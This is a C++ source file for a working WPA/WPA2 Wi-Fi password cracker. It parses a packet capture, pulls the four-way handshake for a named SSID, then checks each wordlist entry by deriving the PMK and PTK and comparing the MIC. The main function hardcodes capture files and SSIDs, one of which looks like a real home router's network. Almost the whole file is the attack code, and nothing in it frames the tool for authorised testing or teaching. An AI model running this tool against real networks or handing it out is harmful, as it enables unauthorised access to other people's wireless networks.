#define _CRT_SECURE_NO_WARNINGS
#include <pcap.h>
#include <iostream>
#include <iomanip>
#include <sstream>
#include <fstream>
#include <vector>
#include <string>
#include <unordered_map>
#include <stdexcept>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include<algorithm>
using ByteVector = std::vector<uint8_t>;

std::string bytesToHexString(const ByteVector& data) {
    std::ostringstream oss;
    for (auto b : data)
        oss << std::hex << std::setfill('0') << std::setw(2) << (int)b;
    return oss.str();
}
std::string macBytesToString(const ByteVector& mac) {
    std::ostringstream oss;
    for (size_t i = 0; i < mac.size(); i++) {
        if (i != 0) oss << ":";
        oss << std::hex << std::setfill('0') << std::setw(2) << (int)mac[i];
    }
    return oss.str();
}
ByteVector parseMacString(const std::string& macStr) {
    ByteVector mac(6);
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    return mac;
}
bool isLessThan(const ByteVector& a, const ByteVector& b) {
    return std::lexicographical_compare(a.begin(), a.end(), b.begin(), b.end());
}

struct Packet {
    std::string addr1;
    std::string addr2;
    bool isEAPOL = false;
    bool isBeacon = false;
    bool isProbeResp = false;
    std::string ssid;
    ByteVector eapolPayload;
};
struct HandshakeParameters {
    ByteVector ap_mac;
    ByteVector client_mac;
    ByteVector anonce;
    ByteVector snonce;
    ByteVector captured_mic;
    ByteVector eapol_frame;
};

int get80211HeaderLen(const uint8_t* dot11) {
    bool toDS = dot11[1] & 0x01;
    bool fromDS = dot11[1] & 0x02;
    bool qos = (dot11[0] & 0x80);
    int len = 24;
    if (toDS && fromDS) len += 6;
    if (qos) len += 2;
    return len;
}
bool parseCapturedPacket(const uint8_t* packet, uint32_t caplen, Packet& pkt) {
    if (caplen < 32) return false;

    const uint8_t* dot11 = packet; // Assuming no Radiotap

    uint8_t type = (dot11[0] >> 2) & 0x3;
    uint8_t subtype = (dot11[0] >> 4) & 0xF;

    pkt.addr1 = macBytesToString(ByteVector(dot11 + 4, dot11 + 10));
    pkt.addr2 = macBytesToString(ByteVector(dot11 + 10, dot11 + 16));

    if (type == 0) { // Management
        if (subtype == 8 || subtype == 5) {
            pkt.isBeacon = (subtype == 8);
            pkt.isProbeResp = (subtype == 5);

            uint32_t pos = 36;
            while (pos + 2 <= caplen) {
                uint8_t tagID = dot11[pos];
                uint8_t tagLen = dot11[pos + 1];
                pos += 2;
                if (pos + tagLen > caplen)
                    break;
                if (tagID == 0) {
                    pkt.ssid = std::string(reinterpret_cast<const char*>(dot11 + pos), tagLen);
                    break;
                }
                pos += tagLen;
            }
            return true;
        }
    }
    else if (type == 2) { // Data (EAPOL check)
        int headerLen = get80211HeaderLen(dot11);
        if (caplen < headerLen + 8) return false;
        const uint8_t* llc = dot11 + headerLen;
        if (llc[6] == 0x88 && llc[7] == 0x8e) {
            pkt.isEAPOL = true;
            pkt.eapolPayload = ByteVector(llc + 8, dot11 + caplen);
            return true;
        }
    }
    return false;
}
HandshakeParameters extractHandshakeParameters(const std::string& cap_file, const std::string& target_ssid) {
    std::unordered_map<std::string, std::string> ssid_to_bssid;
    std::vector<Packet> eapolPackets;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_offline(cap_file.c_str(), errbuf);
    if (!handle)
        throw std::runtime_error("Error opening pcap file: " + std::string(errbuf));

    struct pcap_pkthdr* header;
    const u_char* packet;
    while (pcap_next_ex(handle, &header, &packet) >= 0) {
        if (!packet) continue;
        Packet pkt;
        if (parseCapturedPacket(packet, header->caplen, pkt)) {
            if (pkt.isBeacon || pkt.isProbeResp) {
                if (!pkt.ssid.empty())
                    ssid_to_bssid[pkt.ssid] = pkt.addr2;
            }
            if (pkt.isEAPOL) {
                eapolPackets.push_back(pkt);
            }
        }
    }
    pcap_close(handle);

    if (ssid_to_bssid.find(target_ssid) == ssid_to_bssid.end())
        throw std::runtime_error("Target SSID not found.");

    std::string target_bssid = ssid_to_bssid[target_ssid];

    Packet* message1 = nullptr;
    Packet* message2 = nullptr;

    for (auto& pkt : eapolPackets) {
        if (!message1 && pkt.addr2 == target_bssid) {
            message1 = &pkt;
        }
        else if (message1 && pkt.addr1 == target_bssid) {
            if (pkt.eapolPayload.size() >= 97) {
                bool mic_nonzero = false;
                for (size_t i = 81; i < 97; ++i) {
                    if (pkt.eapolPayload[i] != 0x00) {
                        mic_nonzero = true;
                        break;
                    }
                }
                if (mic_nonzero) {
                    message2 = &pkt;
                    break;
                }
            }
        }
    }

    if (!message1 || !message2)
        throw std::runtime_error("Valid handshake not found.");

    ByteVector ap_mac = parseMacString(message1->addr2);
    ByteVector client_mac = parseMacString(message1->addr1);
    ByteVector anonce(message1->eapolPayload.begin() + 17, message1->eapolPayload.begin() + 49);
    ByteVector snonce(message2->eapolPayload.begin() + 17, message2->eapolPayload.begin() + 49);
    ByteVector captured_mic(message2->eapolPayload.begin() + 81, message2->eapolPayload.begin() + 97);
    ByteVector eapol_frame = message2->eapolPayload;
    std::fill(eapol_frame.begin() + 81, eapol_frame.begin() + 97, 0x00);

    return { ap_mac, client_mac, anonce, snonce, captured_mic, eapol_frame };
}

ByteVector customPRF512(const ByteVector& key, const std::string& A, const ByteVector& B) {
    ByteVector R;
    for (int i = 0; i < 4; ++i) {
        ByteVector data;
        data.insert(data.end(), A.begin(), A.end());
        data.push_back(0x00);
        data.insert(data.end(), B.begin(), B.end());
        data.push_back(i);

        unsigned char result[SHA_DIGEST_LENGTH];
        unsigned int len = SHA_DIGEST_LENGTH;
        HMAC(EVP_sha1(), key.data(), key.size(), data.data(), data.size(), result, &len);

        R.insert(R.end(), result, result + len);
    }
    R.resize(64);
    return R;
}
ByteVector generatePMK(const std::string& password, const std::string& ssid) {
    ByteVector pmk(32);
    PKCS5_PBKDF2_HMAC(password.c_str(), password.length(), reinterpret_cast<const unsigned char*>(ssid.c_str()), ssid.length(), 4096, EVP_sha1(), 32, pmk.data());
    return pmk;
}
void bruteForce(const std::string& ssid, const HandshakeParameters& hp, const std::string& wordlist_path) {
   
    const std::string A = "Pairwise key expansion";

    ByteVector B;
    if (isLessThan(hp.ap_mac, hp.client_mac)) {
        B.insert(B.end(), hp.ap_mac.begin(), hp.ap_mac.end());
        B.insert(B.end(), hp.client_mac.begin(), hp.client_mac.end());
    }
    else {
        B.insert(B.end(), hp.client_mac.begin(), hp.client_mac.end());
        B.insert(B.end(), hp.ap_mac.begin(), hp.ap_mac.end());
    }

    if (isLessThan(hp.anonce, hp.snonce)) {
        B.insert(B.end(), hp.anonce.begin(), hp.anonce.end());
        B.insert(B.end(), hp.snonce.begin(), hp.snonce.end());
    }
    else {
        B.insert(B.end(), hp.snonce.begin(), hp.snonce.end());
        B.insert(B.end(), hp.anonce.begin(), hp.anonce.end());
    }

    std::ifstream infile(wordlist_path);
    if (!infile.is_open()) {
        throw std::runtime_error("Cannot open wordlist.");
    }

    std::string password;
    int tested_count = 0;

    while (std::getline(infile, password)) {
        tested_count++;
        if (password.empty()) 
            continue;

        ByteVector pmk = generatePMK(password, ssid);
        ByteVector ptk = customPRF512(pmk, A, B);

        unsigned char mic_result[SHA_DIGEST_LENGTH];
        unsigned int mic_len = SHA_DIGEST_LENGTH;
        HMAC(EVP_sha1(), ptk.data(), 16, hp.eapol_frame.data(), hp.eapol_frame.size(), mic_result, &mic_len);

        std::string calculated_mic = bytesToHexString(ByteVector(mic_result, mic_result + 16));
        std::string captured_mic_hex = bytesToHexString(hp.captured_mic);

        std::cout << "[*] Testing '" << password << "': Calculated MIC=" << calculated_mic;

        if (calculated_mic == captured_mic_hex) {
            std::cout << "  [MATCH]\n";
            std::cout << "\n[+] Password found: " << password << "\n";
            return;
        }
        else {
            std::cout << "  [No Match]\n";
        }
    }

    std::cout << "\n[-] Password not found after " << tested_count << " tries.\n";
}

int main() {
    try {
       /* const std::string CAP_FILE = "handshake.cap";
        const std::string SSID = "Harkonen";
       */
       const std::string CAP_FILE = "hammm1-07.cap";
       const std::string SSID = "HUAWEI-nK2M";   
        
        const std::string WORDLIST_FILE = "test.txt";

        HandshakeParameters hp = extractHandshakeParameters(CAP_FILE, SSID);

        bruteForce(SSID, hp, WORDLIST_FILE);
    }
    catch (const std::exception& ex) {
        std::cerr << "ERROR: " << ex.what() << "\n";
        return 1;
    }
    return 0;
}
